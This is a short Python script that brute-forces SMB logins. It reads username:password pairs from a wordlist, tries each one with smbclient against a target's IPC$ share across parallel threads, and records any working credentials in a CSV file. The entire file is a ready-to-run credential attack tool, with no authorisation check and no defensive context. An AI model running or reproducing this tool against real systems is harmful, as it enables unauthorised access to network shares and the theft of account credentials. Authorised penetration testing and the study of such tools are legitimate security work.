import subprocess
from concurrent.futures import ThreadPoolExecutor
import os
import csv

def try_login(ip, username, password):
    print(f"Trying: {username}:{password}")
    cmd = ["smbclient", f"//{ip}/IPC$", "-U", f"{username}%{password}", "-m", "NT1"]
    result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    return result.returncode == 0

def run_brute_force(ip, wordlist_path, threads):
    with open(wordlist_path, encoding="latin-1") as f:
        lines = f.read().splitlines()

    combos = []
    for line in lines:
        if ":" in line:
            parts = line.split(":", 1)
            if len(parts) == 2:
                combos.append(parts)

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [executor.submit(try_login, ip, u, p) for u, p in combos]
        for i, f in enumerate(futures):
            if f.result():
                username, password = combos[i]
                os.makedirs("results", exist_ok=True)
                with open("results/found.csv", mode="a", newline="") as file:
                    writer = csv.writer(file)
                    writer.writerow([ip, username, password])
                print(f"[+] Found Valid Credentials: {username}:{password}")
                return combos[i]
    return None
